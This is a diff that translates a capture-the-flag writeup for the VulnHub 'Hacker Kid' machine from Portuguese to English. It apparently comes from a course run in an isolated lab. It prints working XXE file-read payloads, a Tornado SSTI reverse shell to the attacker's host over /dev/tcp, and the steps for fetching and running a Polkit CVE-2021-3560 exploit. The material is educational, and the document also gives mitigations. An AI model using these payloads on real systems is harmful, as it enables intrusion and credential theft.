@@ -1,62 +1,62 @@
 # Hacker Kid (VulnHub) — Writeup
 
-Walkthrough completo de reconhecimento e exploração da máquina vulnerável **"Hacker Kid: 1.0.1"** (VulnHub), do reconhecimento inicial até à obtenção de acesso root, encadeando falha de configuração de DNS, XXE (XML External Entity), SSTI (Server-Side Template Injection) e escalada de privilégios via CVE-2021-3560 (Polkit).
+Full reconnaissance-to-root walkthrough of the **"Hacker Kid: 1.0.1"** vulnerable machine (VulnHub), chaining a DNS misconfiguration, XXE (XML External Entity), SSTI (Server-Side Template Injection), and privilege escalation via CVE-2021-3560 (Polkit).
 
-## Índice
+## Table of contents
 
-- [Sumário executivo](#sumário-executivo)
-- [Ambiente](#ambiente)
-- [1. Reconhecimento de rede](#1-reconhecimento-de-rede)
-- [2. Varrimento de portas e serviços](#2-varrimento-de-portas-e-serviços)
-- [3. Enumeração web (porta 80)](#3-enumeração-web-porta-80)
-- [4. Enumeração DNS](#4-enumeração-dns)
-- [5. Exploração — XXE (XML External Entity)](#5-exploração--xxe-xml-external-entity)
-- [6. Autenticação na aplicação Tornado (porta 9999)](#6-autenticação-na-aplicação-tornado-porta-9999)
-- [7. Exploração — SSTI (Server-Side Template Injection)](#7-exploração--ssti-server-side-template-injection)
-- [8. Escalada de privilégios — CVE-2021-3560 (Polkit)](#8-escalada-de-privilégios--cve-2021-3560-polkit)
-- [9. Cadeia de ataque (resumo visual)](#9-cadeia-de-ataque-resumo-visual)
-- [10. Mitigações](#10-mitigações)
-- [11. Lições aprendidas](#11-lições-aprendidas)
-- [Ficheiros neste repositório](#ficheiros-neste-repositório)
+- [Executive summary](#executive-summary)
+- [Environment](#environment)
+- [1. Network reconnaissance](#1-network-reconnaissance)
+- [2. Port and service scanning](#2-port-and-service-scanning)
+- [3. Web enumeration (port 80)](#3-web-enumeration-port-80)
+- [4. DNS enumeration](#4-dns-enumeration)
+- [5. Exploitation — XXE (XML External Entity)](#5-exploitation--xxe-xml-external-entity)
+- [6. Authenticating to the Tornado app (port 9999)](#6-authenticating-to-the-tornado-app-port-9999)
+- [7. Exploitation — SSTI (Server-Side Template Injection)](#7-exploitation--ssti-server-side-template-injection)
+- [8. Privilege escalation — CVE-2021-3560 (Polkit)](#8-privilege-escalation--cve-2021-3560-polkit)
+- [9. Attack chain (visual summary)](#9-attack-chain-visual-summary)
+- [10. Mitigations](#10-mitigations)
+- [11. Lessons learned](#11-lessons-learned)
+- [Files in this repository](#files-in-this-repository)
 
 ---
 
-## Sumário executivo
+## Executive summary
 
 | | |
 |---|---|
-| **Alvo** | Hacker Kid: 1.0.1 (VulnHub), Ubuntu Linux |
-| **Atacante** | Kali Linux 2026.2 |
-| **Rede** | 192.168.1.0/24 (isolada, VMware) |
-| **Resultado final** | Shell root via CVE-2021-3560 (Polkit local privilege escalation) |
-| **Vulnerabilidades exploradas** | Zone Transfer (AXFR) mal configurado, XML External Entity (XXE), Server-Side Template Injection (SSTI), Local Privilege Escalation (Polkit) |
+| **Target** | Hacker Kid: 1.0.1 (VulnHub), Ubuntu Linux |
+| **Attacker** | Kali Linux 2026.2 |
+| **Network** | 192.168.1.0/24 (isolated, VMware) |
+| **Final result** | Root shell via CVE-2021-3560 (Polkit local privilege escalation) |
+| **Vulnerabilities exploited** | Misconfigured DNS Zone Transfer (AXFR), XML External Entity (XXE), Server-Side Template Injection (SSTI), Local Privilege Escalation (Polkit) |
 | **CVEs** | CVE-2021-3560 |
 
-A máquina apresenta uma página inicial com uma pista textual ("DIG me more") que conduz à enumeração DNS. Um Zone Transfer (AXFR) mal configurado no servidor BIND revela o domínio interno `blackhat.local` e, através de um registo SOA, o subdomínio `hackerkid.blackhat.local` — um virtual host Apache não descoberto por enumeração de diretórios nem por brute-force de subdomínios convencional. Esse subdomínio aloja um formulário de registo vulnerável a XXE, que permite ler ficheiros arbitrários do sistema, incluindo credenciais deixadas propositadamente no `.bashrc` de um utilizador. Essas credenciais autenticam numa segunda aplicação web (Tornado, porta 9999) vulnerável a SSTI, que permite execução remota de comandos e obtenção de shell. A escalada para root explora uma vulnerabilidade conhecida (CVE-2021-3560) no Polkit, através da criação de um novo utilizador administrador via D-Bus.
+The landing page carries a textual clue ("DIG me more") that points directly at DNS enumeration. A misconfigured Zone Transfer (AXFR) on the BIND server reveals an internal domain, `blackhat.local`, and — through the SOA record's contact field — the subdomain `hackerkid.blackhat.local`: an Apache virtual host that neither directory brute-forcing nor conventional vhost fuzzing uncovers. That subdomain hosts a registration form vulnerable to XXE, which allows arbitrary file reads, including credentials deliberately left in a user's `.bashrc`. Those credentials authenticate to a second web application (Tornado, port 9999) that is vulnerable to SSTI, enabling remote command execution and a reverse shell. Privilege escalation to root exploits a known vulnerability (CVE-2021-3560) in Polkit, creating a new administrator account via D-Bus.
 
-## Ambiente
+## Environment
 
 - **Hypervisor:** VMware Workstation Pro
-- **Rede:** LAN interna isolada `192.168.1.0/24`, com OPNsense como gateway (sem necessidade de acesso à internet para o exercício)
+- **Network:** isolated internal LAN `192.168.1.0/24`, with OPNsense as gateway (no internet access required for the exercise)
 - **Kali:** `192.168.1.125`
-- **Alvo (Hacker Kid):** IP dinâmico por DHCP (observado em `192.168.1.138` e `192.168.1.150` em sessões diferentes — os exemplos abaixo usam o IP da sessão em que cada passo foi executado)
+- **Target (Hacker Kid):** dynamic IP via DHCP (observed as both `192.168.1.138` and `192.168.1.150` across sessions — examples below use whichever IP was active at that point)
 
-## 1. Reconhecimento de rede
+## 1. Network reconnaissance
 
-Sem informação prévia sobre o alvo (nem nome, nem IP, nem credenciais), o primeiro passo foi identificar o host na rede de testes.
+With no prior information about the target (no name, no IP, no credentials), the first step was identifying the host on the test network.
 
 ```bash
-ip a                                    # confirmar IP/sub-rede próprios
+ip a                                    # confirm own IP/subnet
 nmap -sn 192.168.1.0/24                 # ping sweep
-sudo arp-scan --interface=eth0 192.168.1.0/24   # descoberta a nível ARP (mais fiável)
+sudo arp-scan --interface=eth0 192.168.1.0/24   # ARP-level discovery (more reliable)
 ```
 
-Resultado: identificado o alvo pelo MAC address da VM (confirmado nas definições de rede do VMware), distinguindo-o da OPNsense.
+Result: the target was identified by its VM MAC address (confirmed in VMware's network settings), distinguishing it from the OPNsense gateway.
 
-## 2. Varrimento de portas e serviços
+## 2. Port and service scanning
 
 ```bash
-nmap -sV -sC -p- <IP_ALVO>
+nmap -sV -sC -p- <TARGET_IP>
 ```
 
 ```
@@ -66,48 +66,48 @@ PORT     STATE SERVICE VERSION
 9999/tcp open  http    Tornado httpd 6.1
 ```
 
-Três serviços expostos: DNS, um servidor web Apache tradicional, e uma aplicação Python (Tornado) numa porta não convencional.
+Three exposed services: DNS, a traditional Apache web server, and a Python application (Tornado) on a non-standard port.
 
-## 3. Enumeração web (porta 80)
+## 3. Web enumeration (port 80)
 
-A página inicial apresenta uma mensagem de um "hacker" fictício com uma pista explícita:
+The landing page displays a message from a fictional "hacker" with an explicit clue:
 
 > "More you will DIG me, more you will find me on your servers..DIG me more...DIG me more"
 
-Enumeração de diretórios:
+Directory enumeration:
 
 ```bash
-gobuster dir -u http://<IP_ALVO>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
 ```
 
-Resultado: `index.php`, `app.html`, `form.html` — todas páginas de template genérico do Bootstrap, sem relevância direta (confirmadas como *red herring*/distração).
+Result: `index.php`, `app.html`, `form.html` — all generic Bootstrap template pages, of no direct relevance (confirmed as a red herring).
 
-O código-fonte de `index.php` contém o comentário:
+The source of `index.php` contains the comment:
 
 ```html
 <!-- TO DO: Use a GET parameter page_no to view pages. -->
 ```
 
-**Nota metodológica:** este parâmetro revelou-se também um red herring — a resposta do servidor é estática e idêntica independentemente do valor de `page_no`, com uma exceção: um brute-force sistemático de valores numéricos (`page_no=1` a `500`, comparando o tamanho da resposta) revelou que `page_no=21` devolve uma mensagem escondida (texto branco/vermelho sobre fundo escuro, invisível a olho nu no browser, mas visível via `curl`) com a pista textual do subdomínio-chave (ver secção seguinte).
+**Methodological note:** this parameter also turned out to be a red herring — the server's response is static and identical regardless of the `page_no` value, with one exception: a systematic brute-force of numeric values (`page_no=1` to `500`, comparing response size) revealed that `page_no=21` returns a hidden message (white/red text on a dark background, invisible to the naked eye in the browser, but visible via `curl`) containing the text-based clue for the key subdomain (see next section).
 
 ```bash
 for i in $(seq 1 500); do
-  size=$(curl -s -o /dev/null -w "%{size_download}" "http://<IP_ALVO>/index.php?page_no=$i")
+  size=$(curl -s -o /dev/null -w "%{size_download}" "http://<TARGET_IP>/index.php?page_no=$i")
   if [ "$size" != "3654" ]; then echo "page_no=$i -> $size bytes"; fi
 done
 ```
 
-## 4. Enumeração DNS
+## 4. DNS enumeration
 
-Seguindo a pista "DIG me more", foi explorado o serviço BIND (porta 53) diretamente:
+Following the "DIG me more" clue, the BIND service (port 53) was probed directly:
 
 ```bash
-dig axfr @<IP_ALVO> 168.192.in-addr.arpa      # zone reversa da rede — revela sub-zona delegada
-dig axfr @<IP_ALVO> 14.168.192.in-addr.arpa   # sub-zona reversa — revela o domínio blackhat.local
-dig axfr @<IP_ALVO> blackhat.local            # zone transfer completa do domínio
+dig axfr @<TARGET_IP> 168.192.in-addr.arpa      # reverse zone for the network — reveals a delegated sub-zone
+dig axfr @<TARGET_IP> 14.168.192.in-addr.arpa   # reverse sub-zone — reveals the blackhat.local domain
+dig axfr @<TARGET_IP> blackhat.local            # full zone transfer for the domain
 ```
 
-O AXFR (Zone Transfer) estava mal configurado e permitiu obter a lista completa da zona `blackhat.local`:
+The AXFR (Zone Transfer) was misconfigured and allowed a full dump of the `blackhat.local` zone:
 
 ```
 blackhat.local.         SOA     blackhat.local. hackerkid.blackhat.local. ...
@@ -121,17 +121,17 @@ ns1/ns2.blackhat.local. A       192.168.14.143
 www.blackhat.local.     CNAME   blackhat.local.
 ```
 
-**Ponto-chave (facilmente ignorado):** o campo de contacto do registo SOA — `hackerkid.blackhat.local` — não é apenas metadado técnico de DNS; é, na verdade, o **subdomínio real com o formulário de registo vulnerável**, confirmado ao testá-lo diretamente como cabeçalho `Host` no Apache:
+**Key detail (easy to miss):** the SOA record's contact field — `hackerkid.blackhat.local` — isn't just DNS metadata; it's actually **the real subdomain hosting the vulnerable registration form**, confirmed by testing it directly as an Apache `Host` header:
 
 ```bash
-curl -s -H "Host: hackerkid.blackhat.local" http://<IP_ALVO>/
+curl -s -H "Host: hackerkid.blackhat.local" http://<TARGET_IP>/
 ```
 
-Este subdomínio não é descoberto por vhost fuzzing convencional (wordlists genéricas) nem consta explicitamente como registo A/CNAME na zona — só é revelado por atenção ao campo de contacto do SOA.
+This subdomain is not discovered by conventional vhost fuzzing (generic wordlists) and doesn't appear explicitly as an A/CNAME record in the zone — it's only revealed by paying attention to the SOA contact field.
 
-## 5. Exploração — XXE (XML External Entity)
+## 5. Exploitation — XXE (XML External Entity)
 
-O subdomínio `hackerkid.blackhat.local` apresenta um formulário de registo ("Create Account"). A inspeção do código-fonte revela que os campos são montados em XML no browser (via JavaScript) e enviados por `POST` para `process.php`:
+The `hackerkid.blackhat.local` subdomain presents a registration form ("Create Account"). Inspecting the source reveals the fields are assembled into XML client-side (via JavaScript) and sent by `POST` to `process.php`:
 
 ```javascript
 var xml = '<?xml version="1.0" encoding="UTF-8"?>' +
@@ -144,11 +144,11 @@ var xml = '<?xml version="1.0" encoding="UTF-8"?>' +
 xmlhttp.open("POST", "process.php", true);
 ```
 
-Este padrão — dados de formulário serializados como XML e processados no servidor — é um candidato clássico a XXE se o parser não desativar o processamento de entidades externas.
+This pattern — form data serialized as XML and processed server-side — is a classic XXE candidate if the parser doesn't disable external entity resolution.
 
-### 5.1 Confirmação da vulnerabilidade
+### 5.1 Confirming the vulnerability
 
-Payload construído com uma entidade externa a apontar para `/etc/passwd`, usando o wrapper PHP `php://filter` para obter o conteúdo em base64 (o wrapper `file://` direto não produziu resultado):
+A payload was built with an external entity pointing at `/etc/passwd`, using the PHP `php://filter` wrapper to get the content back as base64 (the direct `file://` wrapper produced no result):
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -163,22 +163,22 @@ Payload construído com uma entidade externa a apontar para `/etc/passwd`, usand
 
 ```bash
 curl -s -X POST -H "Host: hackerkid.blackhat.local" -H "Content-Type: application/xml" \
-  --data-binary @payload.xml http://<IP_ALVO>/process.php
+  --data-binary @payload.xml http://<TARGET_IP>/process.php
 ```
 
-**Nota importante:** a entidade `&xxe;` tem de estar dentro do campo `<email>`, não do `<name>` — colocá-la no campo errado produz sempre a mesma mensagem de erro genérica ("is not available"), relativa à validação de disponibilidade do email, o que pode induzir em erro na primeira tentativa.
+**Important note:** the `&xxe;` entity has to sit inside the `<email>` field, not `<name>` — placing it in the wrong field always produces the same generic error ("is not available"), tied to email-availability validation, which can mislead the first attempt.
 
-Resultado: o `/etc/passwd` descodificado revelou a existência do utilizador **`saket`** (`/home/saket`, `/bin/bash`).
+Result: the decoded `/etc/passwd` revealed the existence of user **`saket`** (`/home/saket`, `/bin/bash`).
 
-### 5.2 Obtenção de credenciais via `.bashrc`
+### 5.2 Retrieving credentials via `.bashrc`
 
-Repetindo o ataque, apontando a entidade para o ficheiro `.bashrc` do utilizador `saket`:
+Repeating the attack, this time pointing the entity at user `saket`'s `.bashrc`:
 
 ```xml
 <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/saket/.bashrc">
 ```
 
-O `.bashrc` descodificado continha, nas últimas linhas, um comentário do autor do desafio:
+The decoded `.bashrc` contained, in its last lines, a comment from the challenge author:
 
 ```bash
 #Setting Password for running python app
@@ -186,76 +186,76 @@ username="admin"
 password="Saket!#$%@!!"
 ```
 
-**Armadilha do exercício:** o `username="admin"` indicado no comentário **não é o utilizador correto** — a aplicação Tornado exige o username real, `saket` (o autor identifica-se a si próprio em vários pontos do desafio), mantendo a mesma password.
+**Challenge trap:** the `username="admin"` noted in the comment is **not the correct username** — the Tornado app actually expects the real username, `saket` (the author identifies himself as such throughout the challenge), keeping the same password.
 
-## 6. Autenticação na aplicação Tornado (porta 9999)
+## 6. Authenticating to the Tornado app (port 9999)
 
-A aplicação usa proteção XSRF (token de uso único ligado à sessão via cookie), pelo que a autenticação por `curl` exige capturar o cookie de sessão e o valor do campo oculto `_xsrf` antes do `POST`:
+The app uses XSRF protection (a single-use token tied to the session cookie), so authenticating via `curl` requires first capturing the session cookie and the hidden `_xsrf` field value before the `POST`:
 
 ```bash
-curl -s -c cookies.txt http://<IP_ALVO>:9999/login | grep _xsrf
-# extrai o valor de _xsrf da resposta
+curl -s -c cookies.txt http://<TARGET_IP>:9999/login | grep _xsrf
+# extract the _xsrf value from the response
 
-curl -s -i -b cookies.txt -c cookies.txt -X POST http://<IP_ALVO>:9999/login \
+curl -s -i -b cookies.txt -c cookies.txt -X POST http://<TARGET_IP>:9999/login \
   --data-urlencode "username=saket" \
   --data-urlencode "password=Saket!#\$%@!!" \
-  -d "_xsrf=<TOKEN_EXTRAÍDO>"
+  -d "_xsrf=<EXTRACTED_TOKEN>"
 ```
 
-Resultado: `HTTP/1.1 302 Found`, `Location: /`, cookie de sessão `user` atribuído — autenticação bem-sucedida.
+Result: `HTTP/1.1 302 Found`, `Location: /`, a `user` session cookie set — successful authentication.
 
-> **Nota de shell:** em zsh, o carácter `!` na password é interpretado como expansão de histórico e corrompe o comando ao colar. Resolvido com `setopt no_bang_hist` antes de correr o `curl`.
+> **Shell note:** in zsh, the `!` character in the password is interpreted as history expansion and corrupts the command when pasted. Fixed with `setopt no_bang_hist` before running `curl`.
 
-## 7. Exploração — SSTI (Server-Side Template Injection)
+## 7. Exploitation — SSTI (Server-Side Template Injection)
 
-A página principal (autenticada) aceita um parâmetro GET `name` e reflete o valor diretamente na resposta — sinal típico de SSTI:
+The (authenticated) main page accepts a `name` GET parameter and reflects the value directly in the response — a classic SSTI signal:
 
 ```bash
-curl -s -b cookies.txt --get "http://<IP_ALVO>:9999/" --data-urlencode "name={{7*7}}"
+curl -s -b cookies.txt --get "http://<TARGET_IP>:9999/" --data-urlencode "name={{7*7}}"
 ```
 
-Resposta: `Hello 49` — a expressão foi avaliada pelo motor de templates do Tornado, confirmando SSTI.
+Response: `Hello 49` — the expression was evaluated by Tornado's template engine, confirming SSTI.
 
-### 7.1 Execução remota de comandos e shell reversa
+### 7.1 Remote command execution and reverse shell
 
-O Tornado permite importar módulos Python dentro do próprio template com `{% import ... %}`. Explorado para importar `os` e invocar `os.system()`, lançando uma shell reversa para um listener `netcat` na Kali:
+Tornado allows importing Python modules from within a template via `{% import ... %}`. This was used to import `os` and invoke `os.system()`, launching a reverse shell to a `netcat` listener on Kali:
 
 ```bash
 # Terminal 1 (Kali) — listener
 nc -nvlp 4444
 
-# Terminal 2 (Kali) — payload SSTI
-curl -s -b cookies.txt --get "http://<IP_ALVO>:9999/" \
+# Terminal 2 (Kali) — SSTI payload
+curl -s -b cookies.txt --get "http://<TARGET_IP>:9999/" \
   --data-urlencode 'name={% import os %}{{os.system(
-  "bash -c \"bash -i >& /dev/tcp/<IP_KALI>/4444 0>&1\"") }}'
+  "bash -c \"bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1\"") }}'
 ```
 
-Shell obtida como `saket`. Estabilização com PTY completo:
+Shell obtained as `saket`. Stabilized with a full PTY:
 
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-**Cuidado operacional:** interromper esta shell com `Ctrl+C` no lado do atacante pode deixar o processo `os.system()` bloqueado do lado do servidor (o Tornado processa pedidos de forma sequencial numa única thread por defeito), tornando a aplicação inteira sem resposta até reiniciar a VM. Preferir sempre `exit` dentro da shell remota.
+**Operational caution:** interrupting this shell with `Ctrl+C` on the attacker side can leave the server-side `os.system()` process hanging (Tornado processes requests sequentially on a single thread by default), making the whole application unresponsive until the VM is restarted. Always prefer `exit` inside the remote shell.
 
-## 8. Escalada de privilégios — CVE-2021-3560 (Polkit)
+## 8. Privilege escalation — CVE-2021-3560 (Polkit)
 
-Confirmado que a password de `saket` (`Saket!#$%@!!`) é válida **apenas** para a aplicação web — falha tanto em `su -` como em `sudo -l` ao nível do sistema operativo (as credenciais foram deixadas propositadamente só para a app Python, como o próprio comentário no `.bashrc` indicava).
+Confirmed that `saket`'s password (`Saket!#$%@!!`) is valid **only** for the web application — it fails both `su -` and `sudo -l` at the OS level (the credentials were deliberately left only for the Python app, as the `.bashrc` comment itself indicated).
 
-Reconhecimento de vetores sem depender de password:
+Vector discovery without relying on any password:
 
 ```bash
-find / -perm -4000 -type f 2>/dev/null   # binários SUID
+find / -perm -4000 -type f 2>/dev/null   # SUID binaries
 ```
 
-Dois binários SUID chamaram a atenção pelas versões:
+Two SUID binaries stood out because of their versions:
 
 ```bash
 sudo --version      # Sudo version 1.8.31
 pkexec --version     # pkexec version 0.105
 ```
 
-A versão do Polkit (`0.105-26`) corresponde a uma vulnerabilidade local de escalada de privilégios conhecida:
+The Polkit version (`0.105-26`) matches a known local privilege escalation vulnerability:
 
 ```bash
 searchsploit polkit
@@ -264,20 +264,20 @@ searchsploit polkit
 searchsploit -m linux/local/50011.sh
 ```
 
-### 8.1 Transferência e execução do exploit
+### 8.1 Transferring and running the exploit
 
 ```bash
-# Na Kali
+# On Kali
 python3 -m http.server 8000
 
-# Na shell da máquina vulnerável
+# On the vulnerable machine's shell
 cd /tmp
-wget http://<IP_KALI>:8000/50011.sh
+wget http://<KALI_IP>:8000/50011.sh
 chmod +x 50011.sh
 ./50011.sh
 ```
 
-O script recusou-se a correr com o aviso: *"SSH into localhost first before running this script"* — uma verificação superficial que apenas confirma se as variáveis de ambiente `$SSH_CLIENT` e `$SSH_TTY` estão definidas (não valida SSH real). Contornado sem necessidade de SSH:
+The script initially refused to run, warning: *"SSH into localhost first before running this script"* — a shallow check that only verifies whether the `$SSH_CLIENT` and `$SSH_TTY` environment variables are set (it doesn't validate an actual SSH session). Bypassed without needing SSH at all:
 
 ```bash
 export SSH_CLIENT="127.0.0.1 1 22"
@@ -285,7 +285,7 @@ export SSH_TTY="/dev/pts/0"
 ./50011.sh
 ```
 
-O exploit (CVE-2021-3560) abusa de uma condição de corrida no D-Bus/`accountsservice` para criar um novo utilizador administrador (`hacked`, password `password`) antes de o Polkit validar corretamente o pedido:
+The exploit (CVE-2021-3560) abuses a race condition in D-Bus/`accountsservice` to create a new administrator user (`hacked`, password `password`) before Polkit correctly validates the request:
 
 ```
 [*] New user hacked created with uid of 1001
@@ -301,57 +301,57 @@ sudo su
 whoami              # root
 ```
 
-Acesso root confirmado.
+Root access confirmed.
 
-## 9. Cadeia de ataque (resumo visual)
+## 9. Attack chain (visual summary)
 
 ```mermaid
 flowchart TD
-    A[Reconhecimento de rede\nnmap / arp-scan] --> B[Varrimento de portas\n53 DNS, 80 HTTP, 9999 Tornado]
-    B --> C[Enumeração web\nred herrings: page_no, Bootstrap templates]
-    B --> D[Enumeração DNS\nAXFR mal configurado]
-    D --> E[Descoberta do domínio blackhat.local\ne subdomínio hackerkid.blackhat.local\nvia campo SOA]
-    E --> F[XXE no formulário de registo\nprocess.php]
-    F --> G[Leitura de /etc/passwd\ne .bashrc via php://filter]
-    G --> H[Credenciais saket / Saket!#$%@!!]
-    H --> I[Login na app Tornado\nporta 9999]
-    I --> J[SSTI confirmado\nname={{7*7}}]
-    J --> K[Shell reversa\nos.system via SSTI]
-    K --> L[Shell como saket]
-    L --> M[Binário SUID pkexec 0.105\nvulnerável a CVE-2021-3560]
-    M --> N[Exploit cria utilizador admin\nvia D-Bus/Polkit]
+    A[Network recon\nnmap / arp-scan] --> B[Port scan\n53 DNS, 80 HTTP, 9999 Tornado]
+    B --> C[Web enumeration\nred herrings: page_no, Bootstrap templates]
+    B --> D[DNS enumeration\nmisconfigured AXFR]
+    D --> E[Discovery of blackhat.local\nand hackerkid.blackhat.local subdomain\nvia SOA field]
+    E --> F[XXE in registration form\nprocess.php]
+    F --> G[Read /etc/passwd\nand .bashrc via php://filter]
+    G --> H[Credentials saket / Saket!#$%@!!]
+    H --> I[Login to Tornado app\nport 9999]
+    I --> J[SSTI confirmed\nname={{7*7}}]
+    J --> K[Reverse shell\nvia os.system SSTI]
+    K --> L[Shell as saket]
+    L --> M[SUID pkexec 0.105\nvulnerable to CVE-2021-3560]
+    M --> N[Exploit creates admin user\nvia D-Bus/Polkit]
     N --> O[Root]
 ```
 
-## 10. Mitigações
+## 10. Mitigations
 
-| Vulnerabilidade | Mitigação recomendada |
+| Vulnerability | Recommended mitigation |
 |---|---|
-| Zone Transfer (AXFR) aberto | Restringir AXFR apenas a servidores DNS secundários autorizados (`allow-transfer` no BIND); nunca deixar aberto a qualquer origem |
-| Informação sensível em registos SOA/comentários DNS | Não usar subdomínios ou nomes reais de infraestrutura em campos de contacto/metadados DNS |
-| XXE | Desativar resolução de entidades externas no parser XML (`libxml_disable_entity_loader(true)` em PHP, ou configuração equivalente noutras linguagens); validar/sanitizar todo o input XML; preferir formatos como JSON quando a estrutura de entidades externas não é necessária |
-| Credenciais em ficheiros de configuração de shell (`.bashrc`) | Nunca armazenar credenciais em texto simples em ficheiros de perfil de utilizador; usar gestores de segredos (Vault, variáveis de ambiente geridas, etc.) |
-| SSTI | Nunca renderizar input do utilizador diretamente como template; usar sempre autoescaping e separar dados de lógica de apresentação |
-| Binários SUID desatualizados (Polkit/CVE-2021-3560) | Manter o sistema atualizado com patches de segurança; auditar periodicamente binários SUID com `find / -perm -4000`; aplicar o princípio do menor privilégio |
-| Falta de segmentação/hardening geral | Revisão de superfície de ataque completa (serviços expostos desnecessariamente, como a porta DNS acessível externamente numa máquina que não precisa de ser servidor DNS público) |
+| Open Zone Transfer (AXFR) | Restrict AXFR to authorized secondary DNS servers only (`allow-transfer` in BIND); never leave it open to any source |
+| Sensitive info in DNS SOA records/comments | Don't reference real infrastructure subdomains or names in DNS contact/metadata fields |
+| XXE | Disable external entity resolution in the XML parser (`libxml_disable_entity_loader(true)` in PHP, or the equivalent setting in other languages); validate/sanitize all XML input; prefer formats like JSON when external entity resolution isn't actually needed |
+| Credentials stored in shell config files (`.bashrc`) | Never store plaintext credentials in user profile/config files; use secret managers (Vault, managed environment variables, etc.) |
+| SSTI | Never render user input directly as a template; always use autoescaping and keep data separate from presentation logic |
+| Outdated SUID binaries (Polkit/CVE-2021-3560) | Keep the system patched; periodically audit SUID binaries with `find / -perm -4000`; apply the principle of least privilege |
+| Lack of general segmentation/hardening | Full attack-surface review (unnecessarily exposed services, such as a DNS port reachable externally on a machine that doesn't need to be a public DNS server) |
 
-## 11. Lições aprendidas
+## 11. Lessons learned
 
-- A pista textual da página inicial ("DIG me more") era literal e conduzia diretamente à técnica correta (enumeração DNS), mas exigiu persistência com vários subdomínios candidatos antes de se encontrar o AXFR mal configurado.
-- Nem toda a pista aparente é real: o parâmetro `page_no` em `index.php` e os templates Bootstrap (`app.html`, `form.html`) eram *red herrings* — confirmado por comparação de respostas via `curl` em vez de inspeção visual no browser, que pode esconder diferenças subtis (texto colorido sobre fundo escuro).
-- A informação mais valiosa nem sempre está nos registos DNS óbvios (A/CNAME) — o campo de contacto do SOA revelou o subdomínio-chave.
-- O erro do servidor no XXE ("is not available") estava associado à validação do campo email, não ao nome — um detalhe fácil de ignorar que atrasa a primeira tentativa de exploração.
-- Credenciais encontradas num ficheiro não são necessariamente válidas ao nível do sistema operativo — neste caso, funcionavam apenas para a aplicação web, uma distinção confirmada por tentativa direta (`su`, `sudo -l`).
-- Scripts de exploit público podem ter verificações superficiais (como a checagem de `$SSH_CLIENT`/`$SSH_TTY`) que são contornáveis sem comprometer o exploit em si — vale a pena ler o código-fonte do exploit antes de o descartar por um aviso.
-- Interromper uma shell reversa com `Ctrl+C` pode bloquear o processo do lado do servidor (especialmente em aplicações single-threaded como o Tornado por defeito); usar sempre `exit` para encerrar de forma limpa.
-- A combinação de duas vulnerabilidades web distintas (XXE para reconhecimento/credenciais, SSTI para execução remota de código) ilustra como, num pentest real, o acesso inicial raramente vem de uma única falha isolada, mas de uma cadeia de pequenas fugas de informação.
+- The landing page's textual clue ("DIG me more") was literal and pointed straight at the correct technique (DNS enumeration), but required persistence across several candidate subdomains before the misconfigured AXFR was found.
+- Not every apparent clue is real: the `page_no` parameter in `index.php` and the Bootstrap templates (`app.html`, `form.html`) were red herrings — confirmed by comparing responses via `curl` rather than visual inspection in the browser, which can hide subtle differences (colored text on a dark background).
+- The most valuable information isn't always in the obvious DNS records (A/CNAME) — the SOA contact field revealed the key subdomain.
+- The XXE server error ("is not available") was tied to email-field validation, not the name field — an easy detail to miss that delays the first exploitation attempt.
+- Credentials found in a file aren't necessarily valid at the OS level — here they only worked for the web application, a distinction confirmed by direct testing (`su`, `sudo -l`).
+- Public exploit scripts can have shallow checks (like the `$SSH_CLIENT`/`$SSH_TTY` test) that can be bypassed without compromising the exploit itself — it's worth reading an exploit's source before discarding it over a warning.
+- Interrupting a reverse shell with `Ctrl+C` can hang the server-side process (especially in single-threaded-by-default apps like Tornado); always use `exit` to close it cleanly.
+- Chaining two distinct web vulnerabilities (XXE for recon/credentials, SSTI for remote code execution) illustrates how, in a real pentest, initial access rarely comes from a single isolated flaw, but from a chain of small information leaks.
 
-## Ficheiros neste repositório
+## Files in this repository
 
-- [`payloads/payload-etc-passwd.xml`](payloads/payload-etc-passwd.xml) — payload XXE para leitura de `/etc/passwd`
-- [`payloads/payload-bashrc.xml`](payloads/payload-bashrc.xml) — payload XXE para leitura do `.bashrc` do utilizador `saket`
-- [`scripts/page_no_bruteforce.sh`](scripts/page_no_bruteforce.sh) — script de brute-force do parâmetro `page_no`
+- [`payloads/payload-etc-passwd.xml`](payloads/payload-etc-passwd.xml) — XXE payload to read `/etc/passwd`
+- [`payloads/payload-bashrc.xml`](payloads/payload-bashrc.xml) — XXE payload to read user `saket`'s `.bashrc`
+- [`scripts/page_no_bruteforce.sh`](scripts/page_no_bruteforce.sh) — brute-force script for the `page_no` parameter
 
 ---
 
-*Writeup elaborado no âmbito do CET em Cibersegurança — IEFP de Alcoitão. Máquina fornecida pelo formador para fins pedagógicos, em ambiente de laboratório isolado.*
+*Writeup produced as part of the Cybersecurity Vocational Training Program at IEFP Alcoitão (Portugal). Machine provided by the instructor for educational purposes, in an isolated lab environment.*
